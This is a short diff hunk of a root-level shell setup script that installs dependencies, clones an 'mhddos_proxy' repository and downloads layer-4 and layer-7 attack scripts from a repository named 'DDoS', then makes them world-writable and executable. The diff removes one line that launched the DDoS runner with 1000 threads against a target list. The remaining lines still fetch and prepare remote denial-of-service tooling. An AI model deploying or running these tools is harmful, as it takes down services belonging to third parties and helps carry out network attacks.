@@ -23,7 +23,6 @@ cd /root/MHProDev
 pip3 install -r requirements.txt
 python3 -m pip install tabulate
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git /root/mhddos_proxy
-cd /root/mhddos_proxy; python3 runner.py -t 1000 -c /root/list.txt --debug
 wget -O /root/start_layer4.sh https://raw.githubusercontent.com/sania-owner/DDoS/main/start_layer4.sh
 wget -O /root/start_layer7.sh https://raw.githubusercontent.com/sania-owner/DDoS/main/start_layer7.sh
 chmod 0777 /root/start_layer4.sh
